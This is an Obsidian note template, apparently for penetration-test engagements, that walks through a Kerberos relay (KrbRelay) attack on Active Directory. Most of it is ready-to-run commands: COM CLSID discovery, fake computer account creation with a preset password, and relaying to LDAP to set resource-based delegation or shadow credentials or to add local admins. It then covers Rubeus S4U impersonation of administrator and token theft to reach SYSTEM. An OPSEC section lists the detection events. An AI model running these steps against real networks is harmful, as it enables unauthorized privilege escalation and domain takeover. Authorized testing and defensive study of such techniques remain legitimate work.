---
# Attack-specific fields
krbrelay_target: ldap
krbrelay_victim_host:
krbrelay_victim_fqdn:
fake_computer_name: KRBFAKE
fake_computer_password: KrbFakePass123!
s4u_ticket:
notes:
---

# Kerberos Relay (KrbRelay)

> [!abstract] Attack Summary
> **KrbRelay** relays Kerberos authentication without requiring a man-in-the-middle position — it abuses the **COM/RPC** coercion capabilities on the local machine to force authentication to a service you control, then relay that Kerberos ticket to another service (LDAP, SMB) for privilege escalation. Particularly useful for local privilege escalation from a low-privileged shell.

---

## Baseline (from [[00 - Engagement Baseline]])

```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
dv.table(["Field", "Value"], [
  ["Domain",   b?.domain   ?? "—"],
  ["DC IP",    b?.dc_ip    ?? "—"],
  ["DC FQDN",  b?.dc_fqdn  ?? "—"],
  ["Username", b?.username ?? "—"],
  ["OS Env",   b?.os_env   ?? "—"],
]);
```

---

## Attack-Specific Configuration

```dataviewjs
const p = dv.current();
const targets = ["ldap","ldaps","smb"];
const targetOptions = targets.map(t => `option(${t})`).join(',');

dv.table(["Field", "Value"], [
  ["Relay Target Protocol", `\`INPUT[inlineSelect(defaultValue(${p.krbrelay_target ?? 'ldap'}),${targetOptions}):krbrelay_target]\``],
  ["Victim Host (short)",   `\`INPUT[text:krbrelay_victim_host]\``],
  ["Victim FQDN",           `\`INPUT[text:krbrelay_victim_fqdn]\``],
  ["Fake Computer Name",    `\`INPUT[text(defaultValue("${p.fake_computer_name ?? 'KRBFAKE'}")):fake_computer_name]\``],
  ["Fake Computer Password",`\`INPUT[text(defaultValue("${p.fake_computer_password ?? 'KrbFakePass123!'}")):fake_computer_password]\``],
]);
```

> [!info] Prerequisites
> - Local code execution on the target machine (doesn't need to be admin initially)
> - Network access to DC
> - Target machine must have a network connection (not air-gapped)

---

## Step 1 — Find CLSID for COM Coercion

```dataviewjs
dv.paragraph("```bash\n# KrbRelay comes with a helper to find usable CLSIDs\n# Run from the target machine (can be low-priv)\nexecute-assembly C:\\Tools\\KrbRelay\\CheckPort\\bin\\Release\\CheckPort.exe\n\n# Output will show available COM objects:\n# [+] Found suitable CLSID: {XYZ...}\n\n# Common CLSIDs to try:\n# {5167B42F-C111-47A1-ACC4-8EABE61B0B54}  (BITS)\n# {9acf41ed-d457-4cc1-941b-ab02c26e4686}  (UPDATE SESSION)\n# {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}\n```");
```

---

## Step 2a — RBCD via LDAP Relay (Escalate to Local Admin)

> [!info] Relay the machine account's Kerberos auth to LDAP on the DC to set RBCD, then S4U2Self to SYSTEM.

**Windows — KrbRelay with RBCD**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const dc_ip  = b?.dc_ip  ?? "DC_IP";
const dc_fqdn= b?.dc_fqdn ?? "DC_FQDN";
const fakeName = p?.fake_computer_name ?? "KRBFAKE";
const fakePass = p?.fake_computer_password ?? "KrbFakePass123!";
dv.paragraph("```bash\n# Step 1: Create fake computer account (can be low priv if MachineAccountQuota > 0)\nexecute-assembly C:\\Tools\\StandIn\\StandIn\\bin\\Release\\StandIn.exe --computer " + fakeName + " --password " + fakePass + "\n\n# Step 2: Get SID of fake computer\nexecute-assembly C:\\Tools\\ADSearch\\ADSearch\\bin\\Release\\ADSearch.exe --search '(samaccountname=" + fakeName + "$)' --attributes objectSid\n\n# Step 3: Run KrbRelay to relay NTLM → Kerberos → LDAP → RBCD\nexecute-assembly C:\\Tools\\KrbRelay\\KrbRelay\\bin\\Release\\KrbRelay.exe -spn ldap/" + dc_fqdn + " -clsid CLSID_FROM_STEP1 -rbcd FAKE_COMPUTER_SID -port 10243\n\n# KrbRelay will relay auth and set RBCD on the current machine\n```");
```

**Windows — Rubeus S4U after RBCD is set**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain   = b?.domain   ?? "DOMAIN";
const dc_ip    = b?.dc_ip    ?? "DC_IP";
const fakeName = p?.fake_computer_name ?? "KRBFAKE";
const fakePass = p?.fake_computer_password ?? "KrbFakePass123!";
const victimHost = p?.krbrelay_victim_fqdn || "VICTIM.domain.local";
dv.paragraph("```bash\n# Get TGT for fake computer\nexecute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Release\\Rubeus.exe asktgt /user:" + fakeName + "$ /password:" + fakePass + " /domain:" + domain + " /nowrap\n\n# S4U to impersonate local administrator\nexecute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Release\\Rubeus.exe s4u /user:" + fakeName + "$ /password:" + fakePass + " /impersonateuser:administrator /msdsspn:cifs/" + victimHost + " /domain:" + domain + " /nowrap\n\n# Import and use SYSTEM-level ticket\nexecute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Release\\Rubeus.exe createnetonly /program:cmd.exe /domain:" + domain.split('.')[0].toUpperCase() + " /username:administrator /password:FakePass /ticket:BASE64_TICKET\nsteal_token PID\n```");
```

S4U ticket: `INPUT[text:s4u_ticket]`

---

## Step 2b — Shadow Credentials via LDAP Relay

> [!info] Relay machine account auth to LDAP to write to its own `msDS-KeyCredentialLink` attribute, then get a TGT for the machine account via PKINIT.

**Windows — KrbRelay with Shadow Credentials**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const dc_fqdn = b?.dc_fqdn ?? "DC_FQDN";
dv.paragraph("```bash\n# Relay to LDAP and write shadow credential\nexecute-assembly C:\\Tools\\KrbRelay\\KrbRelay\\bin\\Release\\KrbRelay.exe -spn ldap/" + dc_fqdn + " -clsid CLSID -shadowcred -port 10243\n\n# Output: certificate + Rubeus command to request TGT\n# Use the provided Rubeus command to get machine TGT\n\n# Then use machine TGT for S4U2Self → SYSTEM\n```");
```

---

## Step 2c — Add to Local Admins via LDAP

```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const dc_fqdn  = b?.dc_fqdn ?? "DC_FQDN";
const username = b?.username ?? "USER";
dv.paragraph("```bash\n# Relay and add current user to local admins via LDAP\nexecute-assembly C:\\Tools\\KrbRelay\\KrbRelay\\bin\\Release\\KrbRelay.exe -spn ldap/" + dc_fqdn + " -clsid CLSID -addlocaladmin " + username + " -port 10243\n```");
```

---

## Step 3 — Achieve SYSTEM

```dataviewjs
dv.paragraph("```bash\n# After gaining local admin via any method above:\ngetsystem\ngetuid\n\n# Or use S4U2Self with machine TGT\n# See template: 04 - Constrained Delegation for S4U2Self workflow\n```");
```

---

## OPSEC

> [!warning] Detection Indicators
> - COM activation (CoCreateInstance calls) may generate **Sysmon Event 10** or **12/13**.
> - LDAP writes to `msDS-AllowedToActOnBehalfOfOtherIdentity` or `msDS-KeyCredentialLink` generate **Event 5136**.
> - Kerberos tickets for LDAP service from workstations are uncommon.
> - KrbRelay creates unusual COM server/object interactions visible in process monitoring.

---

## Notes & Results

`INPUT[textarea:notes]`
